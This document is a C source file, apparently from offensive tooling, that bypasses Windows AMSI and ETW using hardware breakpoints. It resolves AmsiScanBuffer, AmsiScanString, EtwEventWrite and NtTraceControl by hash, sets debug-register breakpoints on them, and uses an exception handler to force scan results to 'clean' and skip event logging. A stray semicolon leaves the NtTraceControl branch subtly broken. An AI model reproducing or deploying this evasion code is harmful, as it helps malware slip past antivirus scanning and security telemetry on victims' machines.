#include "Common.h"
#include "Amsi.h"

//------------------------------------------------------

// Amsi & Etw functions which will have a breakpoint set onto them

PVOID AmsiScanBufferAddress = NULL;
PVOID NtTraceControlAddress = NULL;
PVOID AmsiScanStringAddress = NULL;
PVOID EtwEventWriteAddress  = NULL;

//------------------------------------------------------

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN SetHardwareBreakpoint(void)
{

	//------------------------------------------------------

	CONTEXT Ctx	= { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	if (!pGetThreadContext(GetCurrentThread(), &Ctx))
	{
#ifdef DEBUG
		PRINT_ERROR("GetThreadContext");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	AmsiScanBufferAddress = ResolveHashedFunction(AMSI_DLL, AmsiScanBuffer_HASH);
	AmsiScanStringAddress = ResolveHashedFunction(AMSI_DLL, AmsiScanString_HASH);
	NtTraceControlAddress = ResolveHashedFunction(NTDLL_DLL,NtTraceControl_HASH);
	EtwEventWriteAddress  = ResolveHashedFunction(NTDLL_DLL, EtwEventWrite_HASH);

	//------------------------------------------------------

	if (!Ctx.Dr0)
	{
		Ctx.Dr0 = (DWORD64)AmsiScanBufferAddress;
		Ctx.Dr7 |= 0x01;
	}
	else if (!Ctx.Dr1)
	{
		Ctx.Dr1 = (DWORD64)AmsiScanStringAddress;
		Ctx.Dr7 |= 0x04;
	}
	else if (!Ctx.Dr2)
	{
		Ctx.Dr2 = (DWORD64)NtTraceControlAddress;
		Ctx.Dr7 |= 0x10;
	}
	else if (!Ctx.Dr3)
	{
		Ctx.Dr3 = (DWORD64)EtwEventWriteAddress;
		Ctx.Dr7 |= 0x40;
	}
	else
	{
		return FALSE;
	}

	//------------------------------------------------------

	if (!pSetThreadContext(GetCurrentThread(), &Ctx))
	{
#ifdef DEBUG
		PRINT_ERROR("SetThreadContext");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

BOOLEAN RemoveHardwareBreakpoint(void)
{

	//------------------------------------------------------

	CONTEXT Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	if (!pGetThreadContext(GetCurrentThread(), &Ctx))
	{
#ifdef DEBUG
		PRINT_ERROR("GetThreadContext");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	if (Ctx.Dr0)
	{
		Ctx.Dr0 = 0x00;
		Ctx.Dr7 &= ~0x01;
	}
	if (Ctx.Dr1)
	{
		Ctx.Dr1 = 0x00;
		Ctx.Dr7 &= ~0x04;
	}
	if (Ctx.Dr2)
	{
		Ctx.Dr2 = 0x00;
		Ctx.Dr7 &= ~0x10;
	}
	if (Ctx.Dr3)
	{
		Ctx.Dr3 = 0x00;
		Ctx.Dr7 &= ~0x40;
	}
	else
	{
		return FALSE;
	}

	//------------------------------------------------------

	if (!pSetThreadContext(GetCurrentThread(), &Ctx))
	{
#ifdef DEBUG
		PRINT_ERROR("SetThreadContext");
#endif
		return FALSE;
	}

	//------------------------------------------------------

	return TRUE;

}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

LONG HardwareBreakpointExceptionHandler
(
	_In_ PEXCEPTION_POINTERS ExceptionInfo
)
{

	//------------------------------------------------------

	PULONG		AmsiResult			= NULL;
	ULONG_PTR	ReturnAddress		= 0;
	PVOID		ExceptionAddress	= ExceptionInfo->ExceptionRecord->ExceptionAddress;
	PCONTEXT	Ctx					= ExceptionInfo->ContextRecord;

	//------------------------------------------------------

	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
	{

		//------------------------------------------------------

		if (ExceptionAddress == AmsiScanBufferAddress)
		{

			AmsiResult		= *(PULONG*)(Ctx->Rsp + 48);

			*AmsiResult		= AMSI_RESULT_CLEAN;
			ReturnAddress	= *(ULONG_PTR*)Ctx->Rsp;
			Ctx->Rip		= ReturnAddress;
			Ctx->Rsp		+= 8;

			Ctx->Rax		= S_OK;

			return EXCEPTION_CONTINUE_EXECUTION;

		}

		//------------------------------------------------------

		else if (ExceptionAddress == AmsiScanStringAddress)
		{

			AmsiResult		= *(PULONG*)(Ctx->Rsp + 40);

			*AmsiResult		= AMSI_RESULT_CLEAN;
			ReturnAddress	= *(ULONG_PTR*)Ctx->Rsp;
			Ctx->Rip		= ReturnAddress;
			Ctx->Rsp		+= 8;

			Ctx->Rax		= S_OK;

			return EXCEPTION_CONTINUE_EXECUTION;

		}

		//------------------------------------------------------

		else if (ExceptionAddress == EtwEventWriteAddress)
		{

			ReturnAddress	= *(ULONG_PTR*)Ctx->Rsp;
			Ctx->Rip		= ReturnAddress;
			Ctx->Rsp		+= sizeof(PVOID);

			Ctx->Rax		= STATUS_SUCCESS;

			return EXCEPTION_CONTINUE_EXECUTION;

		}

		//------------------------------------------------------

		else if (ExceptionAddress == NtTraceControlAddress);
		{

			ReturnAddress	= *(ULONG_PTR*)Ctx->Rsp;
			Ctx->Rip		= ReturnAddress;
			Ctx->Rsp		+= sizeof(PVOID);

			Ctx->Rax		= STATUS_SUCCESS;

			return EXCEPTION_CONTINUE_EXECUTION;

		}

		//------------------------------------------------------

	}

	return EXCEPTION_CONTINUE_SEARCH;

}